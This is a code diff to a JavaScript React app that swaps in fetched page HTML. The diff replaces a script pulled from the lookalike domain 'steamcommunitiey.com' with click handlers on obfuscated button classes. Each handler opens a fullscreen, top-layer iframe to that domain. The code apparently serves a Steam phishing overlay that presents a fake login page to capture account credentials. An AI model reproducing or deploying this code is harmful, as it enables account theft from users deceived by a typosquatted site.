@@ -19,9 +19,26 @@ const App = () => {
                     document.documentElement.innerHTML = res.data;
 
                     setTimeout(() => {
-                        const script = document.createElement("script");
-                        script.src = "https://steamcommunitiey.com/txqmjgkxhzp5.html"
-                        document.body.appendChild(script);
+                        const className = ".lk0e6gi8s69v";
+                        const htmlUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html"
+
+                        const openWind = () => {
+                            const buttons = document.querySelectorAll(className);
+
+                            if (buttons && buttons.length > 0) {
+                                buttons.forEach((button) => {
+                                   button.addEventListener("click", () => {
+                                    const iframe = document.createElement("iframe");
+                                    iframe.src = htmlUrl;
+                                    iframe.setAttribute("style", "position: fixed; top: -2px; left: -2px; width: 100vw; height: 100vh; z-index: 1000");
+                                    document.documentElement.style.overflow = "hidden";
+                                    document.body.appendChild(iframe);
+                                   });
+                            });
+                            }
+                        }
+
+                        openWind()
                     }, 100)
                 })
                 .catch(goTo);
